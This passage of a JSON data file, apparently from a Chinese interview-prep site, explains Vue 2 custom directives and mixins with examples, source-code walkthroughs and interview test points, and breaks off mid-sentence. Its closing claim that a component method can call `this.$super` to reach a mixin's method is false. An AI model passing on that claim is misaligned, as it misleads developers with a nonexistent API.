    "explanation": "### 如何自定义指令？\n\n其实关于这个问题官方文档上已经有了很好的示例的，我们先来温故一下。\n\n除了核心功能默认内置的指令 (`v-model` 和 `v-show`)，Vue 也允许注册自定义指令。注意，在 Vue2.0 中，代码复用和抽象的主要形式是组件。然而，有的情况下，你仍然需要对普通 DOM 元素进行底层操作，这时候就会用到自定义指令。举个聚焦输入框的例子，如下：\n\n当页面加载时，该元素将获得焦点 (注意： `autofocus` 在移动版 `Safari` 上不工作)。事实上，只要你在打开这个页面后还没点击过任何内容，这个输入框就应当还是处于**聚焦状态**。现在让我们用指令来实现这个功能：\n\n```javascript\n// 注册一个全局自定义指令 `v-focus`\nVue.directive('focus', {\n// 当被绑定的元素插入到 DOM 中时……\n    inserted: function (el) {\n        // 聚焦元素\n        el.focus()\n    }\n})\n```\n\n如果想注册局部指令，组件中也接受一个 `directives` 的选项：\n\n```javascript\ndirectives: {\n  focus: {\n    // 指令的定义\n    inserted: function (el) {\n      el.focus()\n    }\n  }\n}\n```\n\n然后你可以在模板中任何元素上使用新的 `v-focus property`，如下：\n\n```html\n<input v-focus>\n```\n\n#### 指令内部提供的钩子函数\n\n一个指令定义对象可以提供如下几个钩子函数 (均为可选)：\n\n*   `bind:` 只调用一次，指令第一次绑定到元素时调用。在这里可以进行一次性的初始化设置。\n*   `inserted:` 被绑定元素插入父节点时调用 (仅保证父节点存在，但不一定已被插入文档中)。\n*   `update:` 所在组件的 VNode 更新时调用，**但是可能发生在其子 VNode 更新之前。**指令的值可能发生了改变，也可能没有。但是你可以通过比较更新前后的值来忽略不必要的模板更新 (详细的钩子函数参数见下)。\n*   `componentUpdated:` 指令所在组件的 VNode 及**其子VNode**全部更新后调用。\n*   `unbind:` 只调用一次，指令与元素解绑时调用。\n\n#### 钩子函数参数\n\n指令钩子函数会被传入以下参数：\n\n*   `el:` 指令所绑定的元素，可以用来直接操作 `DOM` 。\n*   `binding：` 一个对象，包含以下 property：\n*   `name：`指令名，不包括 `v-` 前缀。\n*   `value：`指令的绑定值，例如：`v-my-directive=\"1 + 1\"` 中，绑定值为 2。\n*   `oldValue：`指令绑定的前一个值，仅在 `update` 和 `componentUpdated` 钩子中可用。无论值是否改变都可用。\n*   `expression：`字符串形式的指令表达式。例如 `v-my-directive=\"1 + 1\"` 中，表达式为 `\"1 + 1\"`。\n*   `arg：` 传给指令的参数，可选。例如 `v-my-directive:foo` 中，参数为 \"foo\"。\n*   `modifiers：`一个包含修饰符的对象。例如：`v-my-directive.foo.bar` 中，修饰符对象为 `{ foo: true, bar: true }`。\n*   `vnode：` `Vue` 编译生成的虚拟节点。可以参考官网的 VNode API 来了解更多详情。\n*   `oldVnode：`上一个虚拟节点，仅在 `update` 和 `componentUpdated` 钩子中可用。\n\n除了 `el` 之外，其它参数都应该是**只读的**，切勿进行修改。如果需要在**钩子之间共享数据**，建议通过元素的 `dataset` 来进行。\n\n我们来看一个 `demo`,\n\n```html\n<div id=\"hook-arguments-example\" v-demo:foo.a.b=\"message\"></div>\n```\n\n```javascript\nVue.directive('demo', {\n    bind: function (el, binding, vnode) {\n        var s = JSON.stringify\n        el.innerHTML =\n        'name: '       + s(binding.name) + '<br>' +\n        'value: '      + s(binding.value) + '<br>' +\n        'expression: ' + s(binding.expression) + '<br>' +\n        'argument: '   + s(binding.arg) + '<br>' +\n        'modifiers: '  + s(binding.modifiers) + '<br>' +\n        'vnode keys: ' + Object.keys(vnode).join(', ')\n    }\n})\nnew Vue({\n    el: '#hook-arguments-example',\n    data: {\n        message: 'hello!'\n    }\n})\n```\n\n来看一下渲染的结果：\n\n```javascript\nname: \"demo\"\nvalue: \"hello!\"\nexpression: \"message\"\nargument: \"foo\"\nmodifiers: {\"a\":true,\"b\":true}\nvnode keys: tag, data, children, text, elm, ns, context, fnContext, fnOptions, fnScopeId, key, componentOptions, componentInstance, parent, raw, isStatic, isRootInsert, isComment, isCloned, isOnce, asyncFactory, asyncMeta, isAsyncPlaceholder\n```\n\n### 指令实现原理解析\n\n通过上面官网的例子和我们平时的coding，我们基本上了解了 vue 的指令是如何使用的了，接下来我们从**源码**的视角来解析其实现的原理。\n\n#### Vue.directive 的定义：\n\n```javascript\nfunction initAssetRegisters(Vue) {\n    ASSET_TYPES.forEach(function (type) {\n        Vue[type] = function ( id, definition ) {\n            if (!definition) {\n                return this.options[type + 's'][id]\n            } else {\n                if (type === 'component') {\n                    validateComponentName(id);\n                }\n                if (type === 'component' && isPlainObject(definition)) {\n                    definition.name = definition.name || id;\n                    definition = this.options._base.extend(definition);\n                }\n                if (type === 'directive' && typeof definition === 'function') {\n                    // Tip: 兼容传参\n                    definition = {\n                        bind: definition,\n                        update: definition\n                    };\n                }\n                // Tip: 储存一个 [ 'component', 'directive', 'filter' ]\n                this.options[type + 's'][id] = definition;\n                return definition\n            }\n        };\n    });\n}\n```\n\n其实这个方法比较简单，就是在`vm.options.directives` 挂载了一个映射，比如 `vm.$options.directives.demo = { xxx }`，我们要看看这个指令是如何生效的。\n\n在没有下一步对源码进行分析之前，我们也能大概猜测出自定义指令是如何实现的。在模板编译阶段，从元素的属性中解析到指令属性，在不同生命周期元素阶段调用自定指令中不同的自定义逻辑。接下来配合源码来分析一下，将这个指令解析和生效分为三个阶段：**模板编译阶段，** **生成VNode阶段，** **以及生成真实Dom的patch阶段。**\n\n我们以下面的代码片段为例：\n\n```html\n<div id=\"hook-arguments-example\" v-demo:foo.a.b=\"message\"></div>\n```\n\n#### 模板编译阶段\n\n对模板编译不熟悉的同学可以去回顾一下，这个阶段大致做了什么。这里不去详细介绍了，只关注指令这一部分。指令是元素的属性的一部分，所以在解析标签元素时，会被放入 `Ele Ast` 这个对象的 `attrs` 属性中。上述的示例，会被解析为这样：\n\n```javascript\n[\n    {name: \"id\", value: \"hook-arguments-example\", start: 5, end: 32},\n    {name: \"v-demo:foo.a.b\", value: \"message\", start: 33, end: 57}\n]\n```\n\n在匹配到结束标签时，会进一步处理这些属性，比如：如果是指令的话，会被处理为`directives`挂载到这个`Ele Ast`对象上。\n\n具体的流程如下，在 `endTagMatch` 匹配到结束标签的时候，会去调用处理结束标签的 `parseEndTag` 函数，在这个函数内部回去调用 `parseHtml` 的配置项的 `options.end`，其中又回去调用 `closeElement`。\n\n```javascript\nfunction closeElement(element) {\n    // ...\n    if (!inVPre && !element.processed) {\n        element = processElement(element, options);\n    }\n    // ...\n}\n```\n\n注意这里的 `processElement` 方法，主要是对解析过程中的元素进行各种加工。我们来看一下 `processElement` 的代码。\n\n```javascript\nfunction processElement( element, options ) {\n    processKey(element);\n    processRef(element);\n    processSlotContent(element);\n    processSlotOutlet(element);\n    processComponent(element);\n    // ...\n    processAttrs(element);\n    return element\n}\n```\n\n主要针对一堆元素属性的处理方法，我们需要关注 `processAttrs` 方法，它是处理指令和修饰符相关的方法。我们我看一下 `processAttrs` 的伪代码：\n\n```javascript\nfunction processAttrs(el) {\n    var list = el.attrsList;\n    var i, l, name, rawName, value, modifiers, syncGen, isDynamic;\n    for (i = 0, l = list.length; i < l; i++) {\n        name = rawName = list[i].name;\n        value = list[i].value;\n        // Tip: 解析指令 dirRE = /^v-|^@|^:|^#/;\n        if (dirRE.test(name)) {\n            // ...\n            if (bindRE.test(name)) {\n                // 处理 v-bind 情形\n                if ((modifiers && modifiers.prop) || (\n                        !el.component && platformMustUseProp(el.tag, el.attrsMap.type, name)\n                    )) {\n                    addProp(el, name, value, list[i], isDynamic);\n                } else {\n                    addAttr(el, name, value, list[i], isDynamic);\n                }\n            } else if (onRE.test(name)) { \n                // 处理 v-on 情形\n                addHandler(el, name, value, modifiers, false, warn$2, list[i], isDynamic);\n            } else { \n                // 处理 常规指令情形\n                // Tip：给被解析到的元素，添加 directives 属性\n                addDirective(el, name, rawName, value, arg, isDynamic, modifiers, list[i]);\n            }\n        } else {\n            // ... 处理 literal attribute(文字属性)\n        }\n    }\n}\n```\n\n这里有个 `for` 循环去 `Ele Ast` 的 `attrsList`，然后按照不同的正则去解析他们，分别处理 `v-bind`，`v-on`以及 `v-xx`的情形。对于自定义的指令会通过 `addDirective` 给 `Ele Ast` 添加 directives 属性，如下：\n··\n```javascript\ndirectives = [\n    {\n        arg: \"foo\" , end: 57, isDynamicArg: false, modifiers: { a: true, b: true }, name: \"demo\", rawName: \"v-demo:foo.a.b\", start: 33, value: \"message\"\n    }\n]\n```\n\n在模板解析的第一段阶段指令解析为上述模样。在模板解析的第二阶段 `generate` 将解析得到的 `Ele Ast` 生成产生 `vNode` 的函数字符串。自定义指令也转化为下面的形式了，成为 `_c` 函数的第二个参数了。\n\n\n```css\n\"{directives:[{name:\"demo\",rawName:\"v-demo:foo.a.b\",value:(message),expression:\"message\",arg:\"foo\",modifiers:{\"a\":true,\"b\":true}}],attrs:\n{\"id\":\"hook-arguments-example\"}}\"\n```\n\n#### 生成vNode阶段\n\n在这个 `render` 函数生成 `vNode` 的阶段，生面的指令字符串会被挂载到 `vNode.data.directives` 属性下，\n\n```javascript\nvNode.data.directives = [{\n    arg: \"foo\"\n    expression: \"message\"\n    modifiers: { a: true, b: true }\n    name: \"demo\"\n    rawName: \"v-demo:foo.a.b\"\n    value: \"hello!\"\n}]\n```\n\n#### 生成真实Dom的patch阶段\n\n在这个由 `vNode` 生成真实 `Dom` 的阶段，`createElm` 会去调用 `invokeCreateHooks` （调用 `crate` 阶段所需要的函数）， 会去调用 `updateDirectives` 函数，这里面最终会去调用 `_update` 我们来看下代码：\n\n```javascript\nfunction _update(oldVnode, vnode) {\n    var isCreate = oldVnode === emptyNode;\n\n    // Tip: 获取到全局上自定义的指令函数\n    var oldDirs = normalizeDirectives$1(oldVnode.data.directives, oldVnode.context);\n    var newDirs = normalizeDirectives$1(vnode.data.directives, vnode.context);\n\n    for (key in newDirs) {\n        if (!oldDir) {\n            // new directive, bind\n            callHook$1(dir, 'bind', vnode, oldVnode);\n            if (dir.def && dir.def.inserted) {\n                dirsWithInsert.push(dir);\n            }\n        } else {\n            callHook$1(dir, 'update', vnode, oldVnode);\n        }\n    }\n    if (dirsWithInsert.length) {\n        var callInsert = function () {\n            for (var i = 0; i < dirsWithInsert.length; i++) {\n                callHook$1(dirsWithInsert[i], 'inserted', vnode, oldVnode);\n            }\n        };\n        if (isCreate) {\n            mergeVNodeHook(vnode, 'insert', callInsert);\n        } else {\n            callInsert();\n        }\n    }\n    if (dirsWithPostpatch.length) {\n        mergeVNodeHook(vnode, 'postpatch', function () {\n            for (var i = 0; i < dirsWithPostpatch.length; i++) {\n                callHook$1(dirsWithPostpatch[i], 'componentUpdated', vnode, oldVnode);\n            }\n        });\n    }\n    if (!isCreate) {\n        for (key in oldDirs) {\n            if (!newDirs[key]) {\n                // no longer present, unbind\n                callHook$1(oldDirs[key], 'unbind', oldVnode, oldVnode, isDestroy);\n            }\n        }\n    }\n}\n```\n\n在 `_update` 中，`normalizeDirectives$1` 很重要，是它将我们一开始全局自定义的指令函数对应到当前的节点上。此外，在不同的生命周期也会依据不同的条件去调用不同自定义指令函数。比如，不存在 `oldDir`，就会去调用初始化的`bind`。\n\n### 总结\n\n没有想象中的那么神秘，从一开始的 `Vue.directive` 全局函数的定义以及文档中给不同钩子函数的定义和灌入的参数，我们就有了大概的思路了。通过对自定义指令实现的一步步探究，对整个 `vue` 的流程有了更进一步的了解。此外让我印象深刻的是整个代码逻辑的组织，值得我们去进去挖掘和学习。\n\n",
    "testPoint": "### **1. 自定义指令的基本用法**\n#### **问题：**\n1. Vue 中如何定义和使用自定义指令？\n2. 自定义指令和内置指令有什么不同？\n\n#### **考察点：**\n- **定义自定义指令**：\n  自定义指令通过 `Vue.directive()` 来定义：\n  ```javascript\n  Vue.directive('focus', {\n    // 绑定钩子函数\n    inserted(el) {\n      el.focus();\n    }\n  });\n  ```\n  使用自定义指令：\n  ```vue\n  <input v-focus />\n  ```\n  在这个例子中，`v-focus` 是一个自定义指令，当该元素插入 DOM 后，自动聚焦。\n\n- **内置指令与自定义指令**：\n  - 内置指令（如 `v-if`、`v-for`、`v-model` 等）由 Vue 提供并在应用中广泛使用。\n  - 自定义指令是由开发者自定义的，用于实现特定功能。\n\n---\n\n### **2. 自定义指令的钩子函数**\n#### **问题：**\n1. 自定义指令有哪些生命周期钩子函数？每个钩子函数的作用是什么？\n2. 在 `inserted` 和 `bind` 钩子函数中，如何区分它们的使用场景？\n\n#### **考察点：**\n自定义指令支持以下几个生命周期钩子函数：\n- **`bind`**：只在指令第一次绑定到元素时调用，可以用于设置初始的绑定状态。\n  ```javascript\n  bind(el, binding) {\n    console.log('v-focus bind', el);\n  }\n  ```\n  \n- **`inserted`**：当元素插入到 DOM 中时调用，一般用于操作 DOM 元素。\n  ```javascript\n  inserted(el) {\n    el.focus();\n  }\n  ```\n\n- **`update`**：在组件更新时，指令的值发生变化时调用，但不会调用 `inserted`。\n  ```javascript\n  update(el, binding) {\n    console.log('update', binding.value);\n  }\n  ```\n\n- **`componentUpdated`**：在组件更新时调用，且不管指令的值是否发生变化。\n  ```javascript\n  componentUpdated(el) {\n    console.log('componentUpdated');\n  }\n  ```\n\n- **`unbind`**：在指令与元素解绑时调用，通常用于清理事件监听等操作。\n  ```javascript\n  unbind(el) {\n    console.log('unbind');\n  }\n  ```\n\n---\n\n### **3. 使用参数和修饰符**\n#### **问题：**\n1. 自定义指令如何接收参数和修饰符？\n2. 在自定义指令中，如何通过参数与修饰符实现不同的功能？\n\n#### **考察点：**\n- **传递参数**：可以通过指令的绑定来传递参数：\n  ```vue\n  <input v-focus:delay=\"1000\" />\n  ```\n  在指令的钩子中，`binding.arg` 获取到 `delay` 参数，`binding.value` 获取到值 `1000`。\n\n- **修饰符**：修饰符是通过 `v-directive.modifier` 访问的，用于对指令进行修饰或拓展功能：\n  ```vue\n  <input v-focus.prevent />\n  ```\n  `binding.modifiers.prevent` 可以访问到修饰符 `prevent`。\n\n- **常见场景**：比如实现一个 `v-color` 指令，它可以接收颜色作为参数，且有一个 `.hover` 修饰符控制鼠标悬停时的颜色变化。\n  ```javascript\n  Vue.directive('color', {\n    bind(el, binding) {\n      el.style.color = binding.value; // 绑定的颜色\n    },\n    update(el, binding) {\n      if (binding.modifiers.hover) {\n        el.addEventListener('mouseenter', () => {\n          el.style.color = binding.value;\n        });\n        el.addEventListener('mouseleave', () => {\n          el.style.color = '';\n        });\n      }\n    }\n  });\n  ```\n\n---\n\n### **4. 自定义指令的高级用法**\n#### **问题：**\n1. 如何通过自定义指令访问绑定的值、参数和修饰符？\n2. 如何实现一个自定义指令来操作事件处理、DOM 操作或其他副作用？\n\n#### **考察点：**\n- **访问指令的值**：可以通过 `binding.value` 访问指令绑定的值。\n- **访问修饰符**：通过 `binding.modifiers` 获取指令的修饰符。\n- **访问参数**：通过 `binding.arg` 获取传递给指令的参数。\n\n例如，开发一个 `v-hover` 指令，当鼠标悬停时改变背景色：\n```javascript\nVue.directive('hover', {\n  bind(el, binding) {\n    const originalColor = el.style.backgroundColor;\n    el.addEventListener('mouseenter', () => {\n      el.style.backgroundColor = binding.value || 'yellow'; // 默认颜色为黄色\n    });\n    el.addEventListener('mouseleave', () => {\n      el.style.backgroundColor = originalColor;\n    });\n  }\n});\n```\n使用：\n```vue\n<div v-hover=\"'red'\">Hover over me</div>\n```\n\n---\n\n### **5. 动态注册指令**\n#### **问题：**\n1. 如何动态注册一个自定义指令？\n2. 动态指令的应用场景有哪些？\n\n#### **考察点：**\n- 在 Vue 实例中，你可以动态注册指令：\n  ```javascript\n  Vue.directive('dynamic', {\n    bind(el) {\n      el.style.color = 'blue';\n    }\n  });\n  ```\n\n- **动态指令的应用场景**：\n  - 在多种指令配置之间切换。\n  - 根据组件的不同状态动态控制 DOM 行为。\n\n---\n\n### **6. 性能优化**\n#### **问题：**\n1. 如何优化自定义指令的性能，特别是在大量 DOM 元素上使用时？\n2. 自定义指令中的副作用可能对性能造成什么影响？\n\n#### **考察点：**\n- **避免重复操作**：确保指令的钩子函数不会在不必要的情况下触发，例如避免在 `update` 钩子中频繁操作 DOM。\n- **合理使用事件监听**：在指令中操作 DOM 时，避免频繁的 DOM 操作，可以合并 DOM 更新，减少浏览器的重绘和重排。\n- **销毁副作用**：在 `unbind` 钩子中清理事件监听、定时器等副作用，避免内存泄漏。\n\n---\n\n### **7. 自定义指令的局限性**\n#### **问题：**\n1. Vue 中自定义指令有哪些限制或局限性？\n2. 自定义指令和组件的区别？什么时候选择使用自定义指令而非组件？\n\n#### **考察点：**\n- **限制**：自定义指令只作用于 DOM 元素，无法操作组件的实例或行为。它们主要用于封装 DOM 操作和元素特定的行为。\n- **指令 vs 组件**：\n  - **自定义指令**：适用于直接操作 DOM 元素（例如：焦点控制、事件绑定、样式控制等）。\n  - **组件**：适用于复杂的 UI 逻辑和交互，能够复用多个视图和行为。\n\n---\n\n### **总结**\nVue 中的自定义指令是一个非常强大且灵活的功能，面试中可能会考察以下几个方面：如何定义和使用自定义指令、生命周期钩子函数的理解、如何通过参数和修饰符进行控制、如何操作 DOM 或处理副作用等。面试者应展示出对自定义指令的深刻理解和实际应用能力，以及如何在实际项目中选择使用指令而非组件来优化性能或简化逻辑。",
    "exerciseKeyList": "[\"7f41c072-39f8-4785-ad16-992bf7cacfb7\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-10-05T02:45:32.000Z",
    "updateAt": "2024-12-15T11:55:36.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "7f41c072-39f8-4785-ad16-992bf7cacfb7",
        "title": "自定义指令是什么？有哪些应用场景？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T03:42:51.000Z",
        "updateAt": "2024-08-10T17:04:44.000Z"
      }
    ]
  },
  "77": {
    "id": 77,
    "tagId": 14,
    "title": "mixin-混入",
    "explanation": "\n1\\. 什么是Mixin？\n-------------\n\n想要使用一个事物或者工具，我们首要先了解它是什么，这样我们才好对症下药。\n\n其实Mixin不是Vue专属的，可以说它是一种思想，也可以说它就是混入的意思，在很多开发框架中都实现了Mixin(混入)，我们这里主要讲解的是Vue中的Mixin。\n\n老规矩，先看官方文档。\n\n**官方解释：**\n\n> 混入 (mixin) 提供了一种非常灵活的方式，来分发 Vue 组件中的可复用功能。一个混入对象可以包含任意组件选项。当组件使用混入对象时，所有混入对象的选项将被“混合”进入该组件本身的选项。\n\n官方的解释通常都是晦涩难懂的，因为要专业和准确嘛！\n\n我们可以用我们自己容易理解的话来说说Vue中的Mixin是什么。\n\n**民间解释：**\n\n将组件的公共逻辑或者配置提取出来，哪个组件需要用到时，直接将提取的这部分混入到组件内部即可。这样既可以减少代码冗余度，也可以让后期维护起来更加容易。\n\n这里需要注意的是：提取的是逻辑或配置，而不是HTML代码和CSS代码。其实大家也可以换一种想法，mixin就是组件中的组件，Vue组件化让我们的代码复用性更高，那么组件与组件之间还有重复部分，我们使用Mixin在抽离一遍。\n\n2\\. Mixin和Vuex的区别？\n------------------\n\n上面一点说Mixin就是一个抽离公共部分的作用。在Vue中，Vuex状态管理似乎也是做的这一件事，它也是将组件之间可能共享的数据抽离出来。两者看似一样，实则还是有细微的区别，区别如下：\n\n*   Vuex公共状态管理，如果在一个组件中更改了Vuex中的某个数据，那么其它所有引用了Vuex中该数据的组件也会跟着变化。\n*   Mixin中的数据和方法都是独立的，组件之间使用后是互相不影响的。\n\n3\\. 如何使用？\n---------\n\n我们了解了Mixin的概念，那么如何使用它呢？这才是我们的重点。\n\n### 3.1 准备工作\n\n接下来我们的mixin就放在Vue2.x的脚手架项目中演示。\n\n利用Vue-cli初始化一个最简单的项目：\n\n![](https://static.ecool.fun//article/7d249cee-cab6-4f84-aa21-51e43948379f.awebp)\n\n### 3.1 mixin定义\n\n定义mixin也非常简单，它就是一个对象而已，只不过这个对象里面可以包含Vue组件中的一些常见配置，如data、methods、created等等。\n\n在我们的项目src目录下新建mixin文件夹，然后新建index.js文件，该文件存放我们的mixin代码。\n\n**代码如下：**\n\n```javascript\n// src/mixin/index.js\nexport const mixins = {\n  data() {\n    return {};\n  },\n  computed: {},\n  created() {},\n  mounted() {},\n  methods: {},\n};\n\n```\n\n![](https://static.ecool.fun//article/a2ec7285-0f64-490c-90cd-1b2c564a734b.awebp)\n\n可以看到我们的mixin非常的简单，主要包含了一个Vue组件的常见的逻辑结构。\n\n接下来让我们在mixin中简单的写点东西，**代码如下：**\n\n```javascript\nexport const mixins = {\n  data() {\n    return {\n      msg: \"我是小猪课堂\",\n    };\n  },\n  computed: {},\n  created() {\n    console.log(\"我是mixin中的created生命周期函数\");\n  },\n  mounted() {\n    console.log(\"我是mixin中的mounted生命周期函数\");\n  },\n  methods: {\n    clickMe() {\n      console.log(\"我是mixin中的点击事件\");\n    },\n  },\n};\n\n```\n\n### 3.2 局部混入\n\n我们的公共mixin定义好后，最重要就是如何使用它。根据不同的业务场景，我们可以分为两种：局部混入和全局混入。顾名思义，局部混入和组件的按需加载有点类似，就是需要用到mixin中的代码时，我们再在组件章引入它。全局混入的话，则代表我在项目的任何组件中都可以使用mixin。\n\n组件中引入mixin也非常简单，我们稍微改造下App.vue组件。\n\n**代码如下：**\n\n```javascript\n// src/App.vue\n<template>\n  <div id=\"app\">\n    <img alt=\"Vue logo\" src=\"./assets/logo.png\" />\n    <button @click=\"clickMe\">点击我</button>\n  </div>\n</template>\n\n<script>\nimport { mixins } from \"./mixin/index\";\nexport default {\n  name: \"App\",\n  mixins: [mixins],\n  components: {},\n  created(){\n    console.log(\"组件调用minxi数据\",this.msg);\n  },\n  mounted(){\n    console.log(\"我是组件的mounted生命周期函数\")\n  }\n};\n</script>\n\n```\n\n**效果如下：**\n\n![](https://static.ecool.fun//article/f117952e-7349-4be3-ba37-a118efef2348.awebp)\n\n上段代码中引入mixin的方法也非常简单，直接使用vue提供给我们的mixins属性：mixins:\\[mixins\\]。\n\n通过上面的代码和效果我们可以得出以下几点：\n\n*   mixin中的生命周期函数会和组件的生命周期函数一起合并执行。\n*   mixin中的data数据在组件中也可以使用。\n*   mixin中的方法在组件内部可以直接调用。\n*   生命周期函数合并后执行顺序：先执行mixin中的，后执行组件的。\n\n**问题提出：**\n\n这里我们就提出了一个问题：**一个组件中改动了mixin中的数据，另一个引用了mixin的组件会受影响吗？**\n\n**答案是不会的！**\n\n我们可以尝试一下：\n\n在src下的components文件夹下新建demo组件，代码如下：\n\n```javascript\n// src/components/demo.vue\n<template>\n  <div>mixin中的数据：{{ msg }}</div>\n</template>\n<script>\nimport { mixins } from \"../mixin/index\";\nexport default {\n  mixins: [mixins],\n};\n</script>\n\n```\n\n然后在App.vue组件中引入demo组件，代码如下：\n\n```javascript\n<template>\n  <div id=\"app\">\n    <img alt=\"Vue logo\" src=\"./assets/logo.png\" />\n    <button @click=\"clickMe\">点击我</button>\n    <button @click=\"changeMsg\">更改mixin数据</button>\n    <demo></demo>\n  </div>\n</template>\n\n<script>\nimport { mixins } from \"./mixin/index\";\nimport demo from \"./components/demo.vue\";\nexport default {\n  name: \"App\",\n  mixins: [mixins],\n  components: { demo },\n  created() {\n    console.log(\"组件调用minxi数据\", this.msg);\n  },\n  mounted() {\n    console.log(\"我是组件的mounted生命周期函数\");\n  },\n  methods: {\n    changeMsg() {\n      this.msg = \"我是变异的小猪课堂\";\n      console.log(\"更改后的msg:\", this.msg);\n    },\n  },\n};\n</script>\n\n```\n\n**代码解释：**\n\n*   我们在demo组件中引入了mixin，且使用了mixin中的msg数据。\n*   在App.vue中同样引入了mixin，且设置了点击事件更改msg\n*   点击按钮，更改msg，查看demo组件中显示是否有变化。\n\n效果如下：\n\n![](https://static.ecool.fun//article/3abd9997-cf1e-4054-9aee-c177742244ea.awebp)\n\n可以看到我们在App.vue组件中更改了msg后，demo组件显示没有任何变化，所以这里我们得出结论：不**同组件中的mixin是相互独立的！**\n\n### 3.3 全局混入\n\n上一点我们使用mixin是在需要的组件中引入它，我们也可以在全局先把它注册好，这样我们就可以在任何组件中直接使用了。\n\n修改main.js，代码如下：\n\n```javascript\nimport Vue from \"vue\";\nimport App from \"./App.vue\";\nimport { mixins } from \"./mixin/index\";\nVue.mixin(mixins);\n\nVue.config.productionTip = false;\n\nnew Vue({\n  render: (h) => h(App),\n}).$mount(\"#app\");\n\n```\n\n然后把App.vue中引入mixin的代码注释掉，代码如下：\n\n```javascript\n<template>\n  <div id=\"app\">\n    <img alt=\"Vue logo\" src=\"./assets/logo.png\" />\n    <button @click=\"clickMe\">点击我</button>\n    <button @click=\"changeMsg\">更改mixin数据</button>\n    <demo></demo>\n  </div>\n</template>\n\n<script>\n// import { mixins } from \"./mixin/index\";\nimport demo from \"./components/demo.vue\";\nexport default {\n  name: \"App\",\n  // mixins: [mixins],\n  components: { demo },\n  created() {\n    console.log(\"组件调用minxi数据\", this.msg);\n  },\n  mounted() {\n    console.log(\"我是组件的mounted生命周期函数\");\n  },\n  methods: {\n    changeMsg() {\n      this.msg = \"我是变异的小猪课堂\";\n      console.log(\"更改后的msg:\", this.msg);\n    },\n  },\n};\n</script>\n\n```\n\n**效果如下：**\n\n![](https://static.ecool.fun//article/7b3e888d-073b-41c0-a34f-97f882a366be.awebp)\n\n可以发现效果上和局部混入没有任何区别，这就是全局混入的特点。\n\n虽然这样做很方便，但是我们不推荐，来看看官方的一段话：\n\n> 请谨慎使用全局混入，因为它会影响每个单独创建的 Vue 实例 (包括第三方组件)。大多数情况下，只应当应用于自定义选项，就像上面示例一样。推荐将其作为插件发布，以避免重复应用混入。\n\n### 3.4 选项合并\n\n上面的列子中我们仔细看会发现一个问题：mixin中定义的属性或方法的名称与组件中定义的名称没有冲突！\n\n那么我们不禁会想，如果命名有冲突了怎么办？\n\n我们使用git合并代码的时候经常会有冲突，有冲突了不要怕，我们合并就好了。这里的冲突主要分为以下几种情况：\n\n**（1）生命周期函数**\n\n确切来说，这种不算冲突，因为生命周期函数的名称都是固定的，默认的合并策略如下：\n\n*   先执行mixin中生命周期函数中的代码，然后在执行组件内部的代码，上面的例子其实就很好的证明了。\n\n![](https://static.ecool.fun//article/59e5e16e-15fd-4d73-8bd3-435739cba0ea.awebp)\n\n**（2）data数据冲突**\n\n当mixin中的data数据与组件中的data数据冲突时，组件中的data数据会覆盖mixin中数据，借用官方的一段代码：\n\n```javascript\nvar mixin = {\n  data: function () {\n    return {\n      message: 'hello',\n      foo: 'abc'\n    }\n  }\n}\n\nnew Vue({\n  mixins: [mixin],\n  data: function () {\n    return {\n      message: 'goodbye',\n      bar: 'def'\n    }\n  },\n  created: function () {\n    console.log(this.$data)\n    // => { message: \"goodbye\", foo: \"abc\", bar: \"def\" }\n  }\n})\n\n```\n\n可以看到最终打印的message是组件中message的值，其它没有冲突的数据自然合并了。\n\n**（3）方法冲突**\n\n这种冲突很容易遇到，毕竟大家命名方法的名字很容易一样，这里同样借用官方的一段代码：\n\n```javascript\nvar mixin = {\n  methods: {\n    foo: function () {\n      console.log('foo')\n    },\n    conflicting: function () {\n      console.log('from mixin')\n    }\n  }\n}\n\nvar vm = new Vue({\n  mixins: [mixin],\n  methods: {\n    bar: function () {\n      console.log('bar')\n    },\n    conflicting: function () {\n      console.log('from self')\n    }\n  }\n})\n\nvm.foo() // => \"foo\"\nvm.bar() // => \"bar\"\nvm.conflicting() // => \"from self\"\n\n```\n\n上段代码中mixin和组件中都有conficting方法，但是最终在组件中调用时，实际调用的是组件中的conflicting方法。\n\n当然，如果你要自定义合并规则也不是不可以，但是我觉得没有必要，项目中无需做这么复杂。\n\n4\\. mixin的优缺点\n-------------\n\n从上面的例子看来，使用mixin的好处多多，但是凡是都有两面性，这里总结几点优缺点供大家参考：\n\n### 4.1 优点\n\n*   提高代码复用性\n*   无需传递状态\n*   维护方便，只需要修改一个地方即可\n\n### 4.2 缺点\n\n*   命名冲突\n*   滥用的话后期很难维护\n*   不好追溯源，排查问题稍显麻烦\n*   不能轻易的重复代码\n\n",
    "testPoint": "### **1. Mixin 的基本概念**\n#### **问题：**\n1. 什么是 Mixin？它如何工作？\n2. Mixin 如何在 Vue 组件中使用？\n\n#### **考察点：**\n- **定义 Mixin**：\n  Mixin 是一个包含组件选项的对象，可以包含 `data`、`methods`、`computed`、`watch` 等选项，它们会被合并到组件的选项中。\n  ```javascript\n  const myMixin = {\n    data() {\n      return {\n        mixinData: 'This is from mixin'\n      };\n    },\n    methods: {\n      mixinMethod() {\n        console.log('This is a method from mixin');\n      }\n    }\n  };\n  ```\n\n- **使用 Mixin**：\n  Mixin 可以通过 `mixins` 选项在组件中使用：\n  ```javascript\n  import myMixin from './myMixin';\n\n  export default {\n    mixins: [myMixin],\n    created() {\n      console.log(this.mixinData);  // \"This is from mixin\"\n      this.mixinMethod();  // \"This is a method from mixin\"\n    }\n  };\n  ```\n\n  当 `mixins` 选项被添加到组件中时，Mixin 的数据、方法等都会被合并到该组件中。\n\n---\n\n### **2. Mixin 的合并机制**\n#### **问题：**\n1. Mixin 中的数据、方法等是如何与组件中的选项合并的？\n2. 当组件和 Mixin 中存在同名的钩子函数或方法时，会发生什么？\n\n#### **考察点：**\n- **合并数据**：\n  Mixin 中的 `data` 会与组件的 `data` 合并。如果它们有相同的属性，组件中的属性会覆盖 Mixin 中的属性。\n  ```javascript\n  const myMixin = {\n    data() {\n      return {\n        sharedData: 'mixin data'\n      };\n    }\n  };\n  const myComponent = {\n    data() {\n      return {\n        sharedData: 'component data'\n      };\n    },\n    mixins: [myMixin]\n  };\n  ```\n  最终，`myComponent` 中的 `sharedData` 值为 `'component data'`，因为组件的数据会覆盖 Mixin 的数据。\n\n- **合并方法**：\n  当组件和 Mixin 中都有同名的方法时，组件中的方法会覆盖 Mixin 中的方法。若方法需要同时调用 Mixin 和组件中的方法，可以在方法中调用 `this.$super` 